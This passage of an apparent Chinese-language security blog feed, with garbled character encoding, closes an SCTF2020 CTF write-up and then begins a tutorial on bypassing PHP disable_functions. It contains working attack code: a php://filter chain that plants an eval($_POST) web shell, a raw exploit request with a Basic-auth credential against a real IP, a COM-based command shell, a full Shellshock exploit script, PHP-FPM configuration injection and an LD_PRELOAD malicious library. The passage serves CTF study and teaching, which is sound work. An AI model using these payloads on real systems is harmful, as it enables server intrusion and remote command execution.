eval($_POST[1]);?&gt;&#39;;    $x = str_rot13(base64_encode($payload));    $payload = base64_decode(str_rot13(base64_encode($backdoor)));    assert(base64_decode($x) === $backdoor);</code></pre><p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p><p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p><p>æœ€åçš„payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p><pre><code>POST /public/nationalsb/login.php HTTP/1.1Host: 8.208.102.48Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 126file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#39;cat /flag&#39;);</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/07/07/sctf2020/">http://blog.ccreater.top/2020/07/07/sctf2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass_disable_function_open_basedir</title>
      <link href="/2020/06/30/bypass_disable_function_open_basedir/"/>
      <url>/2020/06/30/bypass_disable_function_open_basedir/</url>
      
        <content type="html"><![CDATA[<h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="å±é™©å‡½æ•°-ç±»"><a href="#å±é™©å‡½æ•°-ç±»" class="headerlink" title="å±é™©å‡½æ•°/ç±»"></a>å±é™©å‡½æ•°/ç±»</h2><pre><code>FFICOMexecassertevalsystemini_set/ini_alterputenvimap_openpcntl_execwin_shell_executedl</code></pre><h2 id="åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡"><a href="#åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡" class="headerlink" title="åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡"></a>åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><pre><code>extension=php_com_dotnet.dllcom.allow_dcom = truewshom.ocx å­˜åœ¨</code></pre><pre><code class="php">$command = $_GET[&#39;cmd&#39;];$wsh = new COM(&#39;WScript.shell&#39;); // ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ã€€Shell.Applicationä¹Ÿèƒ½$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;</code></pre><h2 id="GNU-Bash-ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2014-6271"><a href="#GNU-Bash-ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2014-6271" class="headerlink" title="GNU Bash ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2014-6271"></a>GNU Bash ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2014-6271</h2><blockquote><p>   è¢«æ”»å‡»çš„bashå­˜åœ¨æ¼æ´ï¼ˆç‰ˆæœ¬å°äºç­‰äº4.3ï¼‰<br>   æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡<br>   æ–°çš„bashè¿›ç¨‹è¢«æ‰“å¼€è§¦å‘æ¼æ´å¹¶æ‰§è¡Œå‘½ä»¤</p></blockquote><p>åˆ©ç”¨phpçš„mailå‡½æ•°:<a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35146</a> </p><p><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h3><p>4.3åŠä¹‹å‰çš„bashå¯åŠ¨è§£æç¯å¢ƒå˜é‡æ—¶æœªå¯¹è¾¹ç•Œè¿›è¡Œä¸¥æ ¼çš„é™åˆ¶</p><p>â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œæ²¡æœ‰åšåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚</p><p>bashå‡½æ•°çš„æ ¼å¼,è°ƒç”¨å‡½æ•°åªéœ€å˜é‡å+å‚æ•°å³å¯<code>å‡½æ•° å‚æ•°1 å‚æ•°2</code></p><pre><code class="bash">funtion ShellShock { echo &quot;Injection&quot;} ShellShock   #è°ƒç”¨è¿™ä¸ªå‡½æ•°</code></pre><p>è¿™ä¸ªæ—¶å€™çš„Bashçš„ç¯å¢ƒå˜é‡ï¼š</p><pre><code>KEY = ShellShockVALUE = () { echo Injection; }</code></pre><p>æ¥çœ‹çœ‹ShellShockæ¼æ´çš„çœŸèº«ï¼š</p><pre><code class="shell">export ShellShock=&#39;() { :; }; echo;/usr/bin/whoami&#39;bash&gt;Kr0iN</code></pre><p>çœ‹çœ‹ç¯å¢ƒå˜é‡ä½ æœ‰ä»€ä¹ˆ<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p><pre><code class="bash">env x=&#39;() { :;}; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre><p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="phpçš„mailå‡½æ•°"><a href="#phpçš„mailå‡½æ•°" class="headerlink" title="phpçš„mailå‡½æ•°()"></a>phpçš„mailå‡½æ•°()</h4><p>å¦‚æœæœåŠ¡å™¨çš„é»˜è®¤shæ˜¯bash,mailå‡½æ•°ä¼šç”Ÿæˆä¸€ä¸ªbashè¿›ç¨‹,å†ç»“åˆputenv()åˆ©ç”¨ç ´å£³æ¼æ´æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>ä¼šç”Ÿæˆbashè¿›ç¨‹é™¤äº†mail,phpå‡½æ•°è¿˜æœ‰imap_mailï¼Œå¦‚æœä½ ä»…ä»…é€šè¿‡ç¦ç”¨mailå‡½æ•°æ¥è§„é¿è¿™ä¸ªå®‰å…¨é—®é¢˜ï¼Œé‚£ä¹ˆimap_mailæ˜¯å¯ä»¥åšæ›¿ä»£çš„ã€‚å½“ç„¶ï¼Œphpé‡Œè¿˜å¯èƒ½æœ‰å…¶ä»–åœ°æ–¹æœ‰è°ƒç”¨popenæˆ–å…¶ä»–èƒ½å¤Ÿæ´¾ç”Ÿbashå­è¿›ç¨‹çš„å‡½æ•°ï¼Œé€šè¿‡è¿™äº›åœ°æ–¹ï¼Œéƒ½å¯ä»¥é€šè¿‡ç ´å£³æ¼æ´æ‰§è¡Œå‘½ä»¤çš„ã€‚</p><p>æ›´è¯¦ç»†çš„è§£é‡Š:pç‰›çš„<a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a></p><pre><code class="php"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)# Google Dork: none# Date: 10/31/2014# Exploit Author: Ryan King (Starfall)# Vendor Homepage: http://php.net# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror# Version: 5.* (tested on 5.6.2)# Tested on: Debian 7 and CentOS 5 and 6# CVE: CVE-2014-6271&lt;pre&gt;&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&#39;disable_functions&#39;).&quot;\n&quot;; ?&gt;&lt;?phpfunction shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);     putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);     // In Safe Mode, the user may only alter environment variables whose names     // begin with the prefixes supplied by this directive.     // By default, users will only be able to set environment variables that     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,     // PHP will let the user modify ANY environment variable!     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#39;t actually send any mail   }   else return &quot;Not vuln (not bash)&quot;;   $output = @file_get_contents($tmp);   @unlink($tmp);   if($output != &quot;&quot;) return $output;   else return &quot;No output, or not vuln.&quot;;}echo shellshock($_REQUEST[&quot;cmd&quot;]);?&gt;</code></pre><h2 id="åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´"><a href="#åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´"></a>åˆ©ç”¨php-fpmæœªæˆæƒè®¿é—®æ¼æ´</h2><h3 id="æ¨èæ–‡ç« "><a href="#æ¨èæ–‡ç« " class="headerlink" title="æ¨èæ–‡ç« "></a>æ¨èæ–‡ç« </h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></p><p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼</a></p><h3 id="ä»€ä¹ˆæ˜¯php-fpm"><a href="#ä»€ä¹ˆæ˜¯php-fpm" class="headerlink" title="ä»€ä¹ˆæ˜¯php-fpm"></a>ä»€ä¹ˆæ˜¯php-fpm</h3><p>php-fpmæ˜¯phpå®˜æ–¹çš„fastcgiè§£æå™¨,Nginxç­‰æœåŠ¡å™¨ä¸­é—´ä»¶å°†ç”¨æˆ·è¯·æ±‚æŒ‰ç…§fastcgiçš„è§„åˆ™æ‰“åŒ…å¥½é€šè¿‡TCPä¼ ç»™è°ï¼Ÿå…¶å®å°±æ˜¯ä¼ ç»™FPMã€‚FPMæŒ‰ç…§fastcgiçš„åè®®å°†TCPæµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚</p><p>è¯´åˆ°fastcgi,å°±å¿…é¡»å…ˆè®²ä¸€ä¸‹cgi</p><p>cgiçš„å†å²:</p><blockquote><p>æ—©æœŸçš„webserveråªå¤„ç†htmlç­‰é™æ€æ–‡ä»¶ï¼Œä½†æ˜¯éšç€æŠ€æœ¯çš„å‘å±•ï¼Œå‡ºç°äº†åƒphpç­‰åŠ¨æ€è¯­è¨€ã€‚<br>webserverå¤„ç†ä¸äº†äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿé‚£å°±äº¤ç»™phpè§£é‡Šå™¨æ¥å¤„ç†å§ï¼<br>äº¤ç»™phpè§£é‡Šå™¨å¤„ç†å¾ˆå¥½ï¼Œä½†æ˜¯ï¼Œphpè§£é‡Šå™¨å¦‚ä½•ä¸webserverè¿›è¡Œé€šä¿¡å‘¢ï¼Ÿ<br>ä¸ºäº†è§£å†³ä¸åŒçš„è¯­è¨€è§£é‡Šå™¨(å¦‚phpã€pythonè§£é‡Šå™¨)ä¸webserverçš„é€šä¿¡ï¼Œäºæ˜¯å‡ºç°äº†cgiåè®®ã€‚åªè¦ä½ æŒ‰ç…§cgiåè®®å»ç¼–å†™ç¨‹åºï¼Œå°±èƒ½å®ç°è¯­è¨€è§£é‡Šå™¨ä¸webwerverçš„é€šä¿¡ã€‚å¦‚php-cgiç¨‹åºã€‚</p></blockquote><p>Fast-CGI:</p><p>è™½ç„¶cgiè§£å†³phpè§£é‡Šå™¨ä¸webserverçš„é€šä¿¡é—®é¢˜ï¼Œä½†æ˜¯webserveræ¯æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚å°±ä¼šå»forkä¸€ä¸ªcgiè¿›ç¨‹,è¯·æ±‚ç»“æŸå†killæ‰è¿™ä¸ªè¿›ç¨‹,è¿™æ ·ä¼šå¾ˆæµªè´¹èµ„æº,äºæ˜¯å‡ºç°äº†cgiçš„æ”¹è‰¯ç‰ˆæœ¬ã€‚</p><blockquote><p>fast-cgiæ¯æ¬¡å¤„ç†å®Œè¯·æ±‚åï¼Œä¸ä¼škillæ‰è¿™ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ä¿ç•™è¿™ä¸ªè¿›ç¨‹ï¼Œä½¿è¿™ä¸ªè¿›ç¨‹å¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚è¿™æ ·æ¯æ¬¡å°±ä¸ç”¨é‡æ–°forkä¸€ä¸ªè¿›ç¨‹äº†ï¼Œå¤§å¤§æé«˜äº†æ•ˆç‡ã€‚</p></blockquote><p>php-fpm æ˜¯ä¸€ä¸ªFastcgiçš„å®ç°,å¹¶æä¾›è¿›ç¨‹ç®¡ç†åŠŸèƒ½ã€‚</p><p>è¿›ç¨‹åŒ…å«äº†masterè¿›ç¨‹å’Œworkerè¿›ç¨‹</p><p>masterè¿›ç¨‹åªæœ‰ä¸€ä¸ª,è´Ÿè´£ç›‘å¬ç«¯å£(ä¸€èˆ¬æ˜¯9000)æ¥æ”¶æ¥è‡ªWeb Serverçš„è¯·æ±‚,è€Œworkerè¿›ç¨‹åˆ™ä¸€èˆ¬æœ‰å¤šä¸ª(å…·ä½“æ•°é‡æ ¹æ®å®é™…éœ€è¦é…ç½®),æ¯ä¸ªè¿›ç¨‹å†…éƒ¨éƒ½åµŒå…¥äº†ä¸€ä¸ªphpè§£é‡Šå™¨,æ˜¯phpä»£ç çœŸæ­£æ‰§è¡Œçš„åœ°æ–¹ã€‚</p><p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p><p>ä¸Šé¢ç¬¬ä¸€ä¸ªæ˜¯ä¸»è¿›ç¨‹,ä¸‹é¢ä¸¤ä¸ªæ˜¯workerè¿›ç¨‹ã€‚</p><h3 id="æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹"><a href="#æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹" class="headerlink" title="æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹"></a>æœåŠ¡å™¨åˆ©ç”¨fastcgiçš„é€šä¿¡è¿‡ç¨‹</h3><p>Fastcgiå…¶å®æ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚</p><p>fastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚</p><p>ç±»æ¯”HTTPåè®®æ¥è¯´ï¼Œfastcgiåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚Fastcgiåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™äºŒè€…æŒ‰ç…§fastcgiçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›ç»™æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p><p>recordå…·æœ‰å›ºå®šçš„ç»“æ„ã€‚</p><pre><code class="c">typedef struct {  /* Header */  unsigned char version; // ç‰ˆæœ¬  unsigned char type; // æœ¬æ¬¡recordçš„ç±»å‹  unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id  unsigned char requestIdB0;  unsigned char contentLengthB1; // bodyä½“çš„å¤§å°  unsigned char contentLengthB0;  unsigned char paddingLength; // é¢å¤–å—å¤§å°  unsigned char reserved;   /* Body */  unsigned char contentData[contentLength];  unsigned char paddingData[paddingLength];} FCGI_Record;</code></pre><p>è€Œå…¶ä¸­çš„<code>type</code>å°±æ˜¯æŒ‡å®šè¯¥recordçš„ä½œç”¨ã€‚å› ä¸ºfastcgiä¸€ä¸ªrecordçš„å¤§å°æ˜¯æœ‰é™çš„ï¼Œä½œç”¨ä¹Ÿæ˜¯å•ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªTCPæµé‡Œä¼ è¾“å¤šä¸ªrecordã€‚é€šè¿‡<code>type</code>æ¥æ ‡å¿—æ¯ä¸ªrecordçš„ä½œç”¨ï¼Œç”¨<code>requestId</code>ä½œä¸ºåŒä¸€æ¬¡è¯·æ±‚çš„idã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è¯·æ±‚ï¼Œä¼šæœ‰å¤šä¸ªrecordï¼Œä»–ä»¬çš„<code>requestId</code>æ˜¯ç›¸åŒçš„ã€‚</p><p>å€Ÿç”¨<a href="http://blog.csdn.net/shreck66/article/details/50355729" target="_blank" rel="noopener">è¯¥æ–‡ç« </a>ä¸­çš„ä¸€ä¸ªè¡¨æ ¼ï¼Œåˆ—å‡ºæœ€ä¸»è¦çš„å‡ ç§<code>type</code>ï¼š</p><p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p><p>æ ¹æ®è¿™ä¸ªè¡¨æ ¼æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å’Œåç«¯è¯­è¨€é€šä¿¡ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…å°±æ˜¯<code>type</code>ä¸º1çš„recordï¼Œåç»­äº’ç›¸äº¤æµï¼Œå‘é€<code>type</code>ä¸º4ã€5ã€6ã€7çš„recordï¼Œç»“æŸæ—¶å‘é€<code>type</code>ä¸º2ã€3çš„recordã€‚</p><p>æˆ‘ä»¬è¦å…³æ³¨çš„é‡ç‚¹å°±æ˜¯type=4çš„éƒ¨åˆ†,ä¹Ÿå°±æ˜¯æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡çš„åœ°æ–¹ã€‚</p><p>phpé‡Œæœ‰å¾ˆå¤šæœ‰è¶£çš„è®¾ç½®,åƒæ–‡ä»¶åŒ…å«é‡Œå¸¸ç”¨çš„phpè®¾ç½®<code>auto_prepared_file,auto_append_file</code></p><p>æˆ‘ä»¬ä»¤<code>auto_prepared_file=php://input</code>ä¸”<code>allow_url_include=On</code></p><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨fastcgiæ¥è®¾ç½®phpçš„ç¯å¢ƒå˜é‡</p><p>è¿™åˆæ¶‰åŠåˆ°PHP-FPMçš„ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼Œ<code>PHP_VALUE</code>å’Œ<code>PHP_ADMIN_VALUE</code>ã€‚è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡å°±æ˜¯ç”¨æ¥è®¾ç½®PHPé…ç½®é¡¹çš„ï¼Œ<code>PHP_VALUE</code>å¯ä»¥è®¾ç½®æ¨¡å¼ä¸º<code>PHP_INI_USER</code>å’Œ<code>PHP_INI_ALL</code>çš„é€‰é¡¹ï¼Œ<code>PHP_ADMIN_VALUE</code>å¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚ï¼ˆ<code>disable_functions</code>é™¤å¤–ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œåœ¨èŒƒå›´å†…çš„å‡½æ•°ç›´æ¥ä¸ä¼šè¢«åŠ è½½åˆ°PHPä¸Šä¸‹æ–‡ä¸­ï¼‰</p><p>ç»“æ„ä½“å®ä¾‹:</p><pre><code class="php">array(        &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,        &#39;REQUEST_METHOD&#39; =&gt; &#39;POST&#39;,        &#39;SCRIPT_FILENAME&#39; =&gt; &#39;/var/www/html/index.php&#39;,        &#39;SERVER_SOFTWARE&#39; =&gt; &#39;php/fcgiclient&#39;,        &#39;REMOTE_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,        &#39;REMOTE_PORT&#39; =&gt; &#39;9985&#39;,        &#39;SERVER_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,        &#39;SERVER_PORT&#39; =&gt; &#39;80&#39;,        &#39;SERVER_NAME&#39; =&gt; &#39;mag-tured&#39;,        &#39;SERVER_PROTOCOL&#39; =&gt; &#39;HTTP/1.1&#39;,        &#39;CONTENT_TYPE&#39; =&gt; &#39;application/x-www-form-urlencoded&#39;,        &#39;CONTENT_LENGTH&#39; =&gt; strlen($content),        &#39;PHP_VALUE&#39; =&gt;&#39;auto_append_file=php://input&#39;,        &#39;PHP_ADMIN_VALUE&#39;=&gt;&#39;allow_url_include=On&#39;    )</code></pre><h3 id="åŸç†æµ…æ"><a href="#åŸç†æµ…æ" class="headerlink" title="åŸç†æµ…æ"></a>åŸç†æµ…æ</h3><p>è¿™ä¸ªåŸç†çš„æ¼æ´åŸå› æ˜¯PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´,php-fpmæ²¡æœ‰å¯¹å‘é€æ•°æ®çš„æ¥æºè¿›è¡ŒéªŒè¯,å¯¼è‡´åªè¦æˆ‘ä»¬å‘php-fpmå‘é€ç¬¦åˆæ ¼å¼çš„æ•°æ®å°±å¯ä»¥è¢«è§£æ.å†ç»“åˆfastcgiè®¾ç½®ç¯å¢ƒå˜é‡çš„éƒ¨åˆ†æ¥è¾¾åˆ°getshell</p><h3 id="fpmåˆ©ç”¨è„šæœ¬"><a href="#fpmåˆ©ç”¨è„šæœ¬" class="headerlink" title="fpmåˆ©ç”¨è„šæœ¬"></a>fpmåˆ©ç”¨è„šæœ¬</h3><p>åˆ†äº«ä¸ªpç‰›è„šæœ¬é‡Œé¢çš„ä¸€ä¸ªclientå®¢æˆ·ç«¯: <a href="https://github.com/wuyunfeng/Python-FastCGI-Client" target="_blank" rel="noopener">Python FastCGI Client</a><br>è¿˜æœ‰Lz1yå¸ˆå‚…ç»™çš„ä¸€ä¸ªphpå®¢æˆ·ç«¯ <a href="https://github.com/adoy/PHP-FastCGI-Client.git" target="_blank" rel="noopener">PHP FastCGI Client</a></p><p>è¿˜è¦phpè¯­è¨€å®¢æˆ·ç«¯: <a href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans" target="_blank" rel="noopener">fastcgiå®¢æˆ·ç«¯PHPè¯­è¨€å®ç°</a></p><h2 id="LD-PRELOADç»•è¿‡"><a href="#LD-PRELOADç»•è¿‡" class="headerlink" title="LD_PRELOADç»•è¿‡"></a>LD_PRELOADç»•è¿‡</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>è¿™é‡Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åŸç†ï¼Œé¦–å…ˆä»€ä¹ˆæ˜¯LD_PRELOADï¼Ÿ</p><p>googleç»™å‡ºå¦‚ä¸‹å®šä¹‰</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>å³LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨</p><p>è€Œputenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸‹éªšæ“ä½œ</p><blockquote><p>1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries<br>2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„<br>3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library</p></blockquote><h4 id="åˆ©ç”¨å‡½æ•°"><a href="#åˆ©ç”¨å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡½æ•°"></a>åˆ©ç”¨å‡½æ•°</h4><p><code>putenv,errorlog,mail</code></p><h4 id="å¦‚ä½•åˆ¶ä½œshared-libraries"><a href="#å¦‚ä½•åˆ¶ä½œshared-libraries" class="headerlink" title="å¦‚ä½•åˆ¶ä½œshared libraries"></a>å¦‚ä½•åˆ¶ä½œshared libraries</h4><p>é€‰æ‹©è¦æ›¿æ¢çš„å‡½æ•°æˆ‘ä»¬è¿™é‡Œé€‰å–geteuid()</p><p>ç†ç”±æ˜¯phpçš„mail()å‡½æ•°ä¼šè°ƒç”¨ç³»ç»Ÿçš„sendmailå‘½ä»¤è€Œsendmailå‘½ä»¤ä¼šè°ƒç”¨getuid()è¿™ä¸ªå‡½æ•°,æ‰€ä»¥æˆ‘ä»¬ç¡®å®šç›®æ ‡ä¸ºgeteuidå‡½æ•°</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() {    system(&quot;ls &gt; result.txt&quot;);    }    int  geteuid() {    if (getenv(&quot;LD_PRELOAD&quot;) == NULL)     { return 0; }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();      }</code></pre><p>å½“è¿™ä¸ªå…±äº«åº“ä¸­çš„ <code>geteuid</code> è¢«è°ƒç”¨æ—¶ï¼Œå°è¯•åŠ è½½ <code>payload()</code> å‡½æ•°ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚è¿™ä¸ªæµ‹è¯•å‡½æ•°å†™çš„å¾ˆç®€å•ï¼Œå®é™…åº”ç”¨æ—¶å¯ç›¸åº”è°ƒæ•´å®Œå–„ã€‚åœ¨æ”»å‡»æœºä¸Šï¼ˆæ³¨æ„ç¼–è¯‘å¹³å°åº”å’Œé¶æœºå¹³å°ç›¸è¿‘ï¼Œè‡³å°‘ä¸èƒ½ä¸€ä¸ªæ˜¯ 32 ä½ä¸€ä¸ªæ˜¯ 64 ä½ï¼‰æŠŠå®ƒç¼–è¯‘ä¸ºä¸€ä¸ªä½ç½®ä¿¡æ¯æ— å…³çš„åŠ¨æ€å…±äº«åº“ï¼š</p><pre><code>gcc -c 